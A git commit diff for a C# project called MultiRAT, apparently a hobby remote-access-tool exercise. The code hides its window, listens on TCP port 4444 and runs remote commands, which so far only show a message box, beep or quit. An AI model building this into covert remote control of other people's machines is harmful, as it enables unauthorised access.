df718ee4e0b53f97f38351be39f89fd7abe77b3f
JonasHagstrom79 <73818160+JonasHagstrom79@users.noreply.github.com>
2022-10-01 00:32:13 +0200

    Added opacy to form added RunServer

--- MultiRAT/Form1.cs
+++ MultiRAT/Form1.cs
@@ -3,7 +3,9 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -12,9 +14,52 @@ namespace MultiRAT
 {
     public partial class Form1 : Form
     {
+        TcpListener tcpListener;
+        Socket socketForClient;
+        NetworkStream networkStream;
+        StreamReader streamReader;
         public Form1()
         {
             InitializeComponent();
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            this.Hide();
+            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
+            tcpListener.Start();
+            RunServer();
+        }
+
+        private void RunServer()
+        {
+            socketForClient = tcpListener.AcceptSocket();
+            networkStream = new NetworkStream(socketForClient);
+            streamReader = new StreamReader(networkStream);
+            try
+            {
+                string line;
+                // Command loop, LastOndexOf is for searching within the
+                // network stream for command strings sent by the client
+                while (true)
+                {
+                    line = "";
+                    line = streamReader.ReadLine();
+                    if (line.LastIndexOf("m") >=0)
+                       MessageBox.Show("Hello world");
+                    if (line.LastIndexOf("b") >= 0)
+                        Console.Beep(500, 2000);
+                    if (line.LastIndexOf("q") >= 0)
+                        throw new Exception(); //so that it will be caught below and gracefully close
+                }
+            }
+            catch (Exception err)
+            {
+                streamReader.Close();
+                networkStream.Close();
+                socketForClient.Close();
+                System.Environment.Exit(System.Environment.ExitCode);                
+            }
         }
     }
 }
